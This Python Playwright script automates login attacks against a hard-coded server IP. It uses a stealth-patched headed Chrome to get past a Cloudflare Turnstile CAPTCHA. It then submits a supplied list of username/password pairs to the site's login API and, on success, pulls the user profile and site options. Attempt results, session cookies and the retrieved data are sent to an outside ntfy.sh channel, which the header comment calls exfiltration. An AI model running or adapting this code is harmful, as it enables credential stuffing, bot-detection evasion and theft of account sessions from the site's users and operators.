#!/usr/bin/env python3
# i53080 v5: real system Chrome headed under Xvfb, GPU/WebGL-enabled (swiftshader), stealth,
# DNS coverage for brunhild (IPv6-only) via --host-resolver-rules + /etc/hosts, RICH diagnostics:
# capture the turnstile iframe visible text, window.turnstile.getResponse(), widget state and full
# console/network. If a token is obtained, POST /api/user/login?turnstile=... and (on success) read
# /api/user/self + /api/option. Results + diag exfil'd to ntfy.
import os, sys, time, json, urllib.request, urllib.error, urllib.parse

TARGET = os.environ.get("TARGET", "http://135.148.204.37").rstrip("/")
NT = os.environ.get("NT", "").strip()
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

def log(*a): print(*a, flush=True)

def ntfy(title, msg, prio="default"):
    if not NT: return
    try:
        urllib.request.urlopen(urllib.request.Request("https://ntfy.sh/" + NT,
            data=msg.encode(), headers={"Title": title, "Priority": prio,
            "User-Agent": "i53080"}), timeout=20).read()
    except Exception as e:
        log("ntfy err:", str(e)[:100])

def load_pairs():
    raw = os.environ.get("CREDS", "").strip()
    out = []
    if raw:
        try:
            for x in json.loads(raw):
                out.append((x["u"], x["p"]) if isinstance(x, dict) else (x[0], x[1]))
        except Exception as e:
            log("CREDS parse error:", e)
    return out

def http_post(url, obj):
    body = json.dumps(obj).encode()
    h = {"Content-Type": "application/json", "User-Agent": UA, "Accept": "application/json",
         "Origin": TARGET, "Referer": TARGET + "/sign-in"}
    req = urllib.request.Request(url, data=body, method="POST", headers=h)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read().decode(), r.headers.get_all("Set-Cookie") or []
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(), e.headers.get_all("Set-Cookie") or []

def http_get(url, cookies):
    req = urllib.request.Request(url, headers={"Cookie": "; ".join(cookies), "User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

def snap(page):
    def safe(fn, d=None):
        try: return fn()
        except Exception: return d
    return {
        "title": safe(lambda: page.title(), ""),
        "url": safe(lambda: page.url, ""),
        "frames": safe(lambda: [f.url for f in page.frames], []),
        "nturnstile_input": safe(lambda: page.eval_on_selector_all('input[name="cf-turnstile-response"]', 'e=>e.length'), 0),
        "token_len": safe(lambda: page.eval_on_selector('input[name="cf-turnstile-response"]', 'e=>e.value.length'), 0),
        "ts_obj": safe(lambda: page.evaluate("typeof window.turnstile"), "?"),
        "ts_response": safe(lambda: page.evaluate("(window.turnstile&&window.turnstile.getResponse)?window.turnstile.getResponse():null"), None),
    }

def ts_frame(page):
    for f in page.frames:
        u = (f.url or "")
        if "challenges.cloudflare.com" in u and "turnstile" in u:
            return f
    for f in page.frames:
        if "challenges.cloudflare.com" in (f.url or ""):
            return f
    return None

def frame_text(page):
    f = ts_frame(page)
    if not f: return None, None
    def safe(expr, d=None):
        try: return f.evaluate(expr)
        except Exception as e: return d
    txt = safe("() => { try { return document.body ? document.body.innerText.slice(0,400) : '' } catch(e){ return 'ERR:'+e } }", "")
    html = safe("() => { try { return document.body ? document.body.innerHTML.slice(0,600) : '' } catch(e){ return 'ERR:'+e } }", "")
    return txt, html

def try_click(page):
    f = ts_frame(page)
    if f:
        try:
            for sel in ['input[type="checkbox"]', "label", "body", "div.cf-turnstile", "#cf-stage"]:
                try:
                    el = f.query_selector(sel)
                    if el:
                        bb = el.bounding_box()
                        if bb:
                            page.mouse.click(bb["x"] + bb["width"]/2, bb["y"] + bb["height"]/2)
                            return True, "frame-elem:" + sel
                        try:
                            el.click(timeout=1500); return True, "frame-click:" + sel
                        except Exception:
                            pass
                except Exception:
                    continue
        except Exception:
            pass
    try:
        el = page.query_selector('iframe[src*="challenges.cloudflare.com"]')
        if el:
            bb = el.bounding_box()
            if bb:
                page.mouse.click(bb["x"] + bb["width"]/2, bb["y"] + bb["height"]/2)
                return True, "iframe-center"
    except Exception:
        pass
    return False, "none"

def get_token(page, solve_timeout=120, diag=None, verbose=False):
    console, failed, responses = [], [], []
    page.on("console", lambda m: console.append(f"{m.type}:{m.text}"[:220]))
    page.on("requestfailed", lambda r: failed.append(f"{r.url[:120]} :: {r.failure}"[:220]))
    def on_resp(r):
        if any(k in r.url for k in ["135.148.204.37", "challenges.cloudflare", "cdn-cgi", "turnstile"]):
            responses.append([r.status, r.url[:140]])
    page.on("response", on_resp)
    try:
        page.goto(TARGET + "/sign-in", wait_until="domcontentloaded", timeout=60000)
    except Exception as e:
        log("  goto err:", str(e)[:120])
    time.sleep(7)
    st0 = snap(page)
    if verbose:
        log("DIAG0", json.dumps(st0)[:400])
        txt, html = frame_text(page)
        log("DIAG0 ts_frame_text=", (txt or "")[:200].replace("\n", " "))
    deadline = time.time() + solve_timeout
    clicked = 0
    last = st0
    last_txt = None
    while time.time() < deadline:
        cur = snap(page)
        last = cur
        if cur["token_len"] and cur["token_len"] > 30:
            v = page.eval_on_selector('input[name="cf-turnstile-response"]', 'e=>e.value')
            if diag is not None:
                diag.update({"final_state": cur, "ts_frame_text": last_txt,
                             "console": console[-40:], "failed": failed[-30:], "responses": responses[-40:]})
            return v
        if clicked < 6 and (deadline - time.time()) < solve_timeout - 4:
            ok, how = try_click(page)
            if ok:
                clicked += 1
                if verbose: log(f"  click#{clicked} via {how}")
        try:
            t, h = frame_text(page)
            if t: last_txt = t
        except Exception:
            pass
        time.sleep(1.5)
    if diag is not None:
        diag.update({"final_state": last, "ts_frame_text": last_txt,
                     "console": console[-40:], "failed": failed[-30:], "responses": responses[-40:]})
    return ""

def main():
    pairs = load_pairs()
    log("pairs:", len(pairs), "ntfy:", bool(NT))
    from playwright.sync_api import sync_playwright
    args = [
        "--no-sandbox", "--disable-dev-shm-usage",
        "--disable-blink-features=AutomationControlled",
        "--window-size=1280,900",
        "--ignore-gpu-blocklist", "--enable-webgl", "--enable-unsafe-swiftshader",
        "--use-gl=angle", "--use-angle=swiftshader",
        "--lang=en-US",
        "--host-resolver-rules=MAP brunhild.challenges.cloudflare.com 104.18.16.146,"
        "MAP *.brunhild.challenges.cloudflare.com 104.18.16.146",
    ]
    with sync_playwright() as p:
        browser = None
        for kw in [dict(channel="chrome"), dict()]:
            try:
                browser = p.chromium.launch(headless=False, args=args, **kw)
                log("launched with", kw or "bundled"); break
            except Exception as e:
                log("launch", kw, "failed:", str(e)[:140])
        if browser is None:
            ntfy("i53080 FATAL", "no browser launch"); return
        ctx = browser.new_context(user_agent=UA, viewport={"width": 1280, "height": 900},
                                  locale="en-US", timezone_id="America/New_York",
                                  extra_http_headers={"Accept-Language": "en-US,en;q=0.9"})
        ctx.add_init_script("""
            Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
            Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
            Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
            window.chrome = window.chrome || {runtime:{}};
        """)
        page = ctx.new_page()
        budget = time.time() + int(os.environ.get("BUDGET", "1700"))
        consec_notoken = 0
        gate_crossed = False
        for idx, (u, pw) in enumerate(pairs):
            if time.time() > budget:
                log("BUDGET EXCEEDED at", idx); break
            diag = {} if idx == 0 else None
            tok = get_token(page, solve_timeout=120, diag=diag, verbose=(idx == 0))
            if not tok:
                consec_notoken += 1
                log(f"idx={idx} NO_TOKEN consec={consec_notoken}")
                if idx == 0 and diag is not None:
                    ntfy("i53080 DIAG", json.dumps(diag)[:3900])
                    try: page.screenshot(path="diag.png")
                    except Exception: pass
                try: page.screenshot(path=f"notoken_{idx}.png")
                except Exception: pass
                if consec_notoken >= 2:
                    log("2 consecutive NO_TOKEN -> abort")
                    ntfy("i53080 GATE", json.dumps({"verdict": "NO_TOKEN",
                        "ts_frame_text": (diag or {}).get("ts_frame_text"),
                        "note": "headed chrome, webgl/swiftshader, dns patched; still no token"}))
                    break
                continue
            consec_notoken = 0
            log(f"idx={idx} token_len={len(tok)}")
            st, body, cookies = http_post(TARGET + "/api/user/login?turnstile=" + urllib.parse.quote(tok),
                                          {"username": u, "password": pw})
            cs = [c.split(";")[0] for c in cookies]
            low = body.lower()
            crossed = ("turnstile" not in low) and ("校验失败" not in body)
            if crossed:
                gate_crossed = True
                log(f"idx={idx} GATE_CROSSED http={st} msg={body[:160]}")
            else:
                log(f"idx={idx} blocked http={st} msg={body[:120]}")
            ntfy(f"i53080 attempt {idx} {u}", json.dumps({"idx": idx, "u": u, "http": st,
                 "body": body[:600], "crossed": crossed, "setcookie": cs}))
            try: j = json.loads(body)
            except Exception: j = {}
            if j.get("success") is True:
                log("SUCCESS idx=" + str(idx) + " user=" + u)
                ntfy("i53080 SUCCESS", json.dumps({"u": u, "cookies": cs, "body": body[:600]}))
                if cs:
                    s, t = http_get(TARGET + "/api/user/self", cs); log("self", s); ntfy("i53080 self", t[:1500])
                    s, t = http_get(TARGET + "/api/option/", cs); log("option", s); ntfy("i53080 option", t[:1500])
                browser.close(); return
            time.sleep(2.0)
        try: page.screenshot(path="final.png")
        except Exception: pass
        browser.close()
        log("DONE gate_crossed=" + str(gate_crossed))
        ntfy("i53080 FINAL", json.dumps({"gate_crossed": gate_crossed}))

if __name__ == "__main__":
    main()
